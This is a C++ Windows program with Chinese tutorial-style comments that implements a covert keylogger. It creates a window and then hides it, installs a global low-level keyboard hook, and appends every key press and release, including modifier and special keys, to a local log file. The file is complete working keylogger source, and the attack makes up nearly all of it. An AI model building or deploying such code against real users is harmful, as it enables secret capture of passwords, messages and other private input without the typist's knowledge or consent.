#define _WIN32_WINNT 0x0500
#include <fstream>
#include <windows.h>
#include <iostream>
using namespace std;
const char g_szClassName[] = "Record"; //窗口名
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	WNDCLASSEX wc; 
	HWND hwnd;
	//窗口句柄
	MSG Msg; 
	//消息结构体
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;wc.lpszClassName = g_szClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);RegisterClassEx(&wc);
	//注册窗口类
	hwnd = CreateWindowEx(WS_POPUP| WS_EX_TOOLWINDOW,g_szClassName,"Record",WS_OVERLAPPEDWINDOW,CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,NULL, NULL, hInstance, NULL);ShowWindow(hwnd, SW_SHOW);
	//显示窗口，其实本例中显不显示无所谓啦。。。
	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);
	HHOOK keyboardHook = SetWindowsHookEx(
		//安装钩子
		WH_KEYBOARD_LL,
		//我们关注的消息，本例中关注的是所有键盘事件
		keyboardHookProc,
		//钩子子程序，可以理解为一个回调函数（其实就                                                                                              
		//是），用来处理我们关注的消息；执行先于窗口例程函数
		hInstance,0); 
	while (GetMessage(&Msg, NULL, 0, 0) > 0)
		//窗口程序都有的消息循环
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	return Msg.wParam;
		return 0;
}

//钩子子程序，即用来处理我们关注的键盘消息。这里我把按下的键值记录在“log.txt”文本中
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {

	ofstream out("./log.out", ios::out | ios::app);
	//输出流，记录键值

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);if (wParam == WM_KEYDOWN) {

	//按键被按下
	switch (p->vkCode) 
	{
		case VK_BACK: out << "<BK>"<<endl; break;
		case VK_TAB: out << "<TAB>"<<endl; break;
		case VK_CLEAR: out << "<CLEAR>"<<endl; break;
		case VK_RETURN: out << "<ENTER>"<<endl; break;
		case VK_SHIFT: out << "<SHIFT DOWN>"<<endl; break;
		case VK_CONTROL: out << "<CTRL DOWN>"<<endl; break;
		case VK_MENU: out << "<ALT DOWN>"<<endl; break;
		case VK_PAUSE: out << "<PAUSE>"<<endl; break;
		case VK_CAPITAL: out << "<CAPS LOCK>"<<endl; break;
		case VK_ESCAPE: out << "<ESC>"<<endl; break;
		case VK_SPACE: out << " "<<endl; break;
		case VK_PRIOR: out << "<PAGE UP>"<<endl; break;
		case VK_NEXT: out << "<PAGE DOWN>"<<endl; break;
		case VK_END: out << "<END>"<<endl; break;
		case VK_HOME: out << "<HOME>"<<endl; break;
		case VK_LEFT: out << "<LEFT ARROW>"<<endl; break;
		case VK_UP: out << "<UP ARROW>"<<endl; break;
		case VK_RIGHT: out << "<RIGHT ARROW>"<<endl; break;
		case VK_DOWN: out << "<DOWN ARROW>"<<endl; break;
		case VK_SELECT: out << "<SELECT>"<<endl; break;
		case VK_PRINT: out << "<PRINT>"<<endl; break;
		case VK_EXECUTE: out << "<EXECUTE>"<<endl; break;
		case VK_SNAPSHOT: out << "<PRINT SCREEN>"<<endl; break;
		case VK_INSERT: out << "<INSERT>"<<endl; break;
		case VK_DELETE: out << "<DEL>"<<endl; break;
		case VK_HELP: out << "<HELP>"<<endl; break;
		case VK_LWIN: out << "<Left Windows key DOWN>"<<endl; break;
		case VK_RWIN: out << "<Right Windows key DOWN>"<<endl; break;
		case VK_APPS: out << "<Applications key>"<<endl; break;
		case VK_SLEEP: out << "<Computer Sleep key>"<<endl; break;
		case VK_NUMPAD0: out << "0"<<endl; break;
		case VK_NUMPAD1: out << "1"<<endl; break;
		case VK_NUMPAD2: out << "2"<<endl; break;
		case VK_NUMPAD3: out << "3"<<endl; break;
		case VK_NUMPAD4: out << "4"<<endl; break;
		case VK_NUMPAD5: out << "5"<<endl; break;
		case VK_NUMPAD6: out << "6"<<endl; break;
		case VK_NUMPAD7: out << "7"<<endl; break;
		case VK_NUMPAD8: out << "8"<<endl; break;
		case VK_NUMPAD9: out << "9"<<endl; break;
		case VK_MULTIPLY: out << "*"<<endl; break;
		case VK_ADD: out << "+"<<endl; break;
		case VK_SEPARATOR: out << "<Separator key>"<<endl; break;
		case VK_SUBTRACT: out << "-"<<endl; break;
		case VK_DECIMAL: out << "."<<endl; break;
		case VK_DIVIDE: out << "/"<<endl; break;
		case VK_F1: out << "<F1>"<<endl; break;
		case VK_F2: out << "<F2>"<<endl; break;
		case VK_F3: out << "<F3>"<<endl; break;
		case VK_F4: out << "<F4>"<<endl; break;
		case VK_F5: out << "<F5>"<<endl; break;
		case VK_F6: out << "<F6>"<<endl; break;
		case VK_F7: out << "<F7>"<<endl; break;
		case VK_F8: out << "<F8>"<<endl; break;
		case VK_F9: out << "<F9>"<<endl; break;
		case VK_F10: out << "<F10>"<<endl; break;
		case VK_F11: out << "<F11>"<<endl; break;
		case VK_F12: out << "<F12>"<<endl; break;
		case VK_NUMLOCK: out << "<NUM LOCK>"<<endl; break;
		case VK_SCROLL: out << "<SCROLL LOCK>"<<endl; break;
		case VK_LSHIFT: out << "<Left SHIFT DOWN>"<<endl; break;
		case VK_RSHIFT: out << "<Right SHIFT DOWN>"<<endl; break;
		case VK_LCONTROL: out << "<Left CONTROL DOWN>"<<endl; break;
		case VK_RCONTROL: out << "<Right CONTROL DOWN>"<<endl; break;
		case VK_LMENU: out << "<Left MENU>"<<endl; break;
		case VK_RMENU: out << "<Right MENU>"<<endl; break;
		case VK_BROWSER_BACK: out << "<Browser Back key>"<<endl; break;
		case VK_BROWSER_FORWARD: out << "<Browser Forward key>"<<endl; break;
		case VK_BROWSER_REFRESH: out << "<Browser Refresh key>"<<endl; break;
		case VK_BROWSER_STOP: out << "<Browser Stop key>"<<endl; break;
		case VK_BROWSER_SEARCH: out << "<Browser Search key >"<<endl; break;
		case VK_BROWSER_FAVORITES: out << "<Browser Favorites key>"<<endl; break;
		case VK_BROWSER_HOME: out << "<Browser Start and Home key>"<<endl; break;
		case VK_VOLUME_MUTE: out << "<Volume Mute key>"<<endl; break;
		case VK_VOLUME_DOWN: out << "<Volume Down key>"<<endl; break;
		case VK_VOLUME_UP: out << "<Volume Up key>"<<endl; break;
		case VK_MEDIA_NEXT_TRACK: out << "<Next Track key>"<<endl; break;
		case VK_MEDIA_PREV_TRACK: out << "<Previous Track key>"<<endl; break;
		case VK_MEDIA_STOP: out << "<Stop Media key>"<<endl; break;
		case VK_MEDIA_PLAY_PAUSE: out << "<Play/Pause Media key>"<<endl; break;
		case VK_LAUNCH_MAIL: out << "<Start Mail key>"<<endl; break;
		case VK_LAUNCH_MEDIA_SELECT: out << "<Select Media key>"<<endl; break;
		case VK_LAUNCH_APP1: out << "<Start Application 1 key>"<<endl; break;
		case VK_LAUNCH_APP2: out << "<Start Application 2 key>"<<endl; break;
		case VK_OEM_1: out << "<;:' key >"<<endl; break;
		case VK_OEM_PLUS: out << "+"<<endl; break;
		case VK_OEM_COMMA: out << ","<<endl; break;
		case VK_OEM_MINUS: out << "-"<<endl; break;
		case VK_OEM_PERIOD: out << "."<<endl; break;
		case VK_OEM_2: out << "</?' key >"<<endl; break;
		case VK_OEM_3: out << "<`~' key >"<<endl; break;
		case VK_OEM_4: out << "<[{' key>"<<endl; break;
		case VK_OEM_5: out << "<\|' key>"<<endl; break;
		case VK_OEM_6: out << "<]}' key>"<<endl; break;
		case VK_OEM_7: out << "<single-quote/double-quote' key>"<<endl; break;
		case VK_OEM_CLEAR: out << "<Clear>"<<endl; break;
		default:out << char(tolower(p->vkCode)) ;
	}

}



	if (wParam == WM_KEYUP)
	{
		//按键被释放
		switch (p->vkCode)
		{	case VK_SHIFT: 
			out << "<SHIFT UP>" << endl; break; 
			case VK_CONTROL: 
				out << "<CTRL UP>" << endl; break; 
			case VK_MENU:
				out << "<ALT UP>" << endl; break; 
			case VK_LSHIFT: 
				out << "<Left SHIFT UP>" << endl; break; 
			case VK_RSHIFT: 
				out << "<Right SHIFT UP>" << endl; break;
			case VK_LCONTROL:
				out << "<Left CONTROL UP>" << endl; break; 
			case VK_RCONTROL:
				out << "<Right CONTROL UP>" << endl; break; 
			case VK_LWIN:
				out << "<Left Windows key UP>" << endl; break;
			case VK_RWIN:
				out << "<Right Windows key UP>" << endl; break; 
			default:goto a; a:;
		}
	}
	out.close();
		//关闭流
	return CallNextHookEx(NULL, nCode, wParam, lParam);
	//不是我们关注的消息，交给下一个钩子处 
	//理:CallNextHookEx(). 本例中因为只安装一个钩子，所以调用该
	//函数是把消息交给窗口的消息处理函数。
	return 0;
}

//窗口例程函数，该函数处理窗口的消息，但是执行时间在钩子函数之后
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) 
	{
		case WM_CLOSE:
			DestroyWindow(hwnd); break;
		case WM_DESTROY:
			PostQuitMessage(0); break; 
		default:
			return DefWindowProc(hwnd, msg, wParam, lParam);
		//其他函数交给窗口的默认处理函数}return 0;
	}
}

